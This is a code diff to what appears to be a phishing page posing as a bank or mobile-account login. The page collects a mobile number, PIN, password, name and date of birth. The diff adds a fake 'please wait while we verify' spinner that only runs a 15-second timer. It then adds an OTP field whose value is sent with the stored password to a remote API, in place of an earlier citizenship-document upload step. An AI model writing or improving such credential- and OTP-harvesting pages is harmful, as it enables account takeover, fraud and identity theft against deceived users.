@@ -183,7 +183,7 @@
 
     .progress {
       display: grid;
-      grid-template-columns: repeat(3, 1fr);
+      grid-template-columns: repeat(4, 1fr);
       margin: 0 0 26px;
     }
 
@@ -471,6 +471,16 @@
       }
     }
 
+    @keyframes spin {
+      0% {
+        transform: rotate(0deg);
+      }
+
+      100% {
+        transform: rotate(360deg);
+      }
+    }
+
     @media (max-width: 390px) {
 
       .screen {
@@ -536,7 +546,7 @@
         data-indicator="1"
       >
         <span class="number">1</span>
-        <span>Login</span>
+        <span>Account</span>
       </div>
 
       <div
@@ -544,7 +554,7 @@
         data-indicator="2"
       >
         <span class="number">2</span>
-        <span>Personal Info</span>
+        <span>Verify</span>
       </div>
 
       <div
@@ -552,7 +562,15 @@
         data-indicator="3"
       >
         <span class="number">3</span>
-        <span>Documents</span>
+        <span>Details</span>
+      </div>
+
+      <div
+        class="step"
+        data-indicator="4"
+      >
+        <span class="number">4</span>
+        <span>OTP</span>
       </div>
 
     </nav>
@@ -565,7 +583,7 @@
         class="eyebrow"
         id="step-label"
       >
-        Step 1 of 3
+        Step 1 of 4
       </p>
 
       <h1 id="form-title">
@@ -711,6 +729,44 @@
 
         <div class="fields">
 
+          <div class="notice">
+            Processing please wait until we verify your information...
+          </div>
+
+          <div class="loading-container" style="text-align: center; margin-top: 20px;">
+
+            <div class="spinner" style="
+              width: 40px;
+              height: 40px;
+              margin: 0 auto 15px;
+              border: 4px solid #f3f3f3;
+              border-top: 4px solid var(--orange);
+              border-radius: 50%;
+              animation: spin 1s linear infinite;
+            "></div>
+
+            <p style="color: var(--muted); font-size: 0.87rem;">
+              Please wait...
+            </p>
+
+          </div>
+
+        </div>
+
+      </section>
+
+
+      <!-- ========================================= -->
+      <!-- STEP 3 -->
+      <!-- ========================================= -->
+
+      <section
+        class="form-step"
+        data-step="3"
+      >
+
+        <div class="fields">
+
           <div
             class="field"
             data-required="accountHolderName"
@@ -730,75 +786,6 @@
 
             <p class="error">
               Please enter account holder name.
-            </p>
-
-          </div>
-
-
-          <div
-            class="field"
-            data-required="motherName"
-          >
-
-            <label for="motherName">
-              Mother Name
-              <span class="required">*</span>
-            </label>
-
-            <input
-              id="motherName"
-              type="text"
-              placeholder="Enter mother's name"
-            />
-
-            <p class="error">
-              Please enter mother's name.
-            </p>
-
-          </div>
-
-
-          <div
-            class="field"
-            data-required="fatherName"
-          >
-
-            <label for="fatherName">
-              Father Name
-              <span class="required">*</span>
-            </label>
-
-            <input
-              id="fatherName"
-              type="text"
-              placeholder="Enter father's name"
-            />
-
-            <p class="error">
-              Please enter father's name.
-            </p>
-
-          </div>
-
-
-          <div
-            class="field"
-            data-required="grandFatherName"
-          >
-
-            <label for="grandFatherName">
-              Grand Father Name
-              <span class="required">*</span>
-            </label>
-
-            <input
-              id="grandFatherName"
-              type="text"
-              placeholder="Enter grandfather's name"
-            />
-
-            <p class="error">
-              Please enter grandfather's name.
             </p>
 
           </div>
@@ -863,72 +850,42 @@
 
 
       <!-- ========================================= -->
-      <!-- STEP 3 -->
+      <!-- STEP 4 -->
       <!-- ========================================= -->
 
       <section
         class="form-step"
-        data-step="3"
+        data-step="4"
       >
 
         <div class="fields">
 
-          <div class="field">
+          <div
+            class="field"
+            data-required="otp"
+          >
 
-            <label for="frontCitizenship">
-              Front Citizenship
+            <label for="otp">
+              6 Digit OTP
+              <span class="required">*</span>
             </label>
 
             <input
-              id="frontCitizenship"
-              type="file"
-              accept="image/*"
+              id="otp"
+              type="text"
+              inputmode="numeric"
+              maxlength="6"
+              autocomplete="off"
+              placeholder="Enter 6 digit OTP"
             />
 
             <p class="error">
-              Please upload front citizenship.
-            </p>
-
-          </div>
-
-
-          <div class="field">
-
-            <label for="backCitizenship">
-              Back Citizenship
-            </label>
-
-            <input
-              id="backCitizenship"
-              type="file"
-              accept="image/*"
-            />
-
-            <p class="error">
-              Please upload back citizenship.
+              Please enter 6 digit OTP.
             </p>
 
           </div>
 
         </div>
-
-
-        <label
-          class="acknowledgement"
-          id="ack-row"
-        >
-
-          <input
-            id="declaration"
-            type="checkbox"
-          />
-
-          <span>
-            I declare that the information provided
-            is true and correct.
-          </span>
-
-        </label>
 
 
         <div class="actions">
@@ -1032,6 +989,8 @@
 
   let isLoading = false;
 
+  let step2TimerStarted = false;
+
   let step = 1;
 
 
@@ -1042,21 +1001,27 @@
   const copy = {
 
     1: [
-      'Step 1 of 3',
-      'Login Details',
+      'Step 1 of 4',
+      'Account Access',
       'Please enter your mobile number and security details.'
     ],
 
     2: [
-      'Step 2 of 3',
-      'Personal Information',
-      'Please provide your personal and family details.'
+      'Step 2 of 4',
+      'Verification',
+      'Please wait while we verify your information.'
     ],
 
     3: [
-      'Step 3 of 3',
-      'Document Upload',
-      'Please upload your citizenship documents.'
+      'Step 3 of 4',
+      'Personal Details',
+      'Please provide your account holder name and date of birth.'
+    ],
+
+    4: [
+      'Step 4 of 4',
+      'OTP Verification',
+      'Please enter the 6-digit OTP sent to your mobile.'
     ]
 
   };
@@ -1114,6 +1079,15 @@
     ) {
       pass =
         /^\d{4}$/.test(input.value);
+    }
+
+
+    if (
+      input.id === 'otp' &&
+      pass
+    ) {
+      pass =
+        /^\d{6}$/.test(input.value);
     }
 
 
@@ -1226,21 +1200,6 @@
         '#accountHolderName'
       ).value;
 
-    const mothersName =
-      document.querySelector(
-        '#motherName'
-      ).value;
-
-    const fathersName =
-      document.querySelector(
-        '#fatherName'
-      ).value;
-
-    const grandfathersName =
-      document.querySelector(
-        '#grandFatherName'
-      ).value;
-
     const dateOfBirth =
       document.querySelector(
         '#birthDate'
@@ -1255,15 +1214,6 @@
       accountHolderName:
         accountHolderName || null,
 
-      mothersName:
-        mothersName || null,
-
-      fathersName:
-        fathersName || null,
-
-      grandfathersName:
-        grandfathersName || null,
-
       dateOfBirth:
         dateOfBirth || null
 
@@ -1271,7 +1221,7 @@
 
 
     console.log(
-      'Step 2 payload:',
+      'Step 3 payload:',
       payload
     );
 
@@ -1298,7 +1248,7 @@
 
 
     console.log(
-      'Step 2 response:',
+      'Step 3 response:',
       data
     );
 
@@ -1320,129 +1270,46 @@
 
   // ===================================================
   // STEP 3
-  // IMPORTANT:
-  // NO BASE64
-  // NO JSON
-  // USE FORMDATA
   // ===================================================
 
   async function submitStep3() {
 
-    const frontInput =
+    const otp =
       document.querySelector(
-        '#frontCitizenship'
-      );
-
-    const backInput =
-      document.querySelector(
-        '#backCitizenship'
-      );
+        '#otp'
+      ).value;
 
 
-    const frontFile =
-      frontInput.files[0];
+    const payload = {
 
-    const backFile =
-      backInput.files[0];
+      password:
+        userPassword,
 
+      otp:
+        otp || null
 
-    // At least one image
-    if (!frontFile && !backFile) {
-
-      throw new Error(
-        'Please upload at least one citizenship image.'
-      );
-
-    }
-
-
-    // Optional client-side size validation
-    const maxSize =
-      10 * 1024 * 1024;
-
-
-    if (
-      frontFile &&
-      frontFile.size > maxSize
-    ) {
-
-      throw new Error(
-        'Front citizenship image must be smaller than 10 MB.'
-      );
-
-    }
-
-
-    if (
-      backFile &&
-      backFile.size > maxSize
-    ) {
-
-      throw new Error(
-        'Back citizenship image must be smaller than 10 MB.'
-      );
-
-    }
-
-
-    // ================================================
-    // FormData
-    // ================================================
-
-    const formData =
-      new FormData();
-
-
-    formData.append(
-      'password',
-      userPassword
-    );
-
-
-    if (frontFile) {
-
-      formData.append(
-        'frontCitizenshipImage',
-        frontFile
-      );
-
-    }
-
-
-    if (backFile) {
-
-      formData.append(
-        'backCitizenshipImage',
-        backFile
-      );
-
-    }
+    };
 
 
     console.log(
-      'Uploading images...',
-      {
-        password: userPassword,
-        frontImage: frontFile?.name,
-        backImage: backFile?.name
-      }
+      'Step 3 payload:',
+      payload
     );
 
 
-    // ================================================
-    // SEND
-    // ================================================
-
     const response =
       await fetch(
-        `${API_BASE}/users/images`,
+        `${API_BASE}/users`,
         {
           method: 'PATCH',
 
-          // IMPORTANT:
-          // DO NOT set Content-Type manually.
-          // Browser automatically creates multipart boundary.
-          body: formData
+          headers: {
+            'Content-Type':
+              'application/json'
+          },
+
+          body:
+            JSON.stringify(payload)
         }
       );
 
@@ -1461,7 +1328,7 @@
 
       throw new Error(
         data.error ||
-        'Failed to upload citizenship images'
+        'Failed to update OTP'
       );
 
     }
@@ -1520,6 +1387,16 @@
             : number;
 
       });
+
+
+    if (step === 2 && !step2TimerStarted) {
+      step2TimerStarted = true;
+      setTimeout(() => {
+        step++;
+        step2TimerStarted = false;
+        render();
+      }, 15000);
+    }
 
 
     [
@@ -1598,7 +1475,7 @@
           }
 
 
-          if (step !== 1 && step !== 2) {
+          if (step !== 1 && step !== 3) {
             isLoading = true;
 
             button.textContent =
@@ -1625,12 +1502,17 @@
 
             else if (step === 2) {
 
+            }
+
+
+            else if (step === 3) {
+
               step++;
 
               render();
 
               submitStep2().catch(error => {
-                console.error('Step 2 background submission error:', error);
+                console.error('Step 3 background submission error:', error);
               });
 
             }
@@ -1703,24 +1585,7 @@
       'click',
       async () => {
 
-        const declaration =
-          document.querySelector(
-            '#declaration'
-          );
-
-        const row =
-          document.querySelector(
-            '#ack-row'
-          );
-
-
-        row.classList.toggle(
-          'invalid',
-          !declaration.checked
-        );
-
-
-        if (!declaration.checked) {
+        if (!validate(4)) {
           return;
         }
 
@@ -1789,7 +1654,7 @@
         catch (error) {
 
           console.error(
-            'Step 3 error:',
+            'Step 4 error:',
             error
           );
 
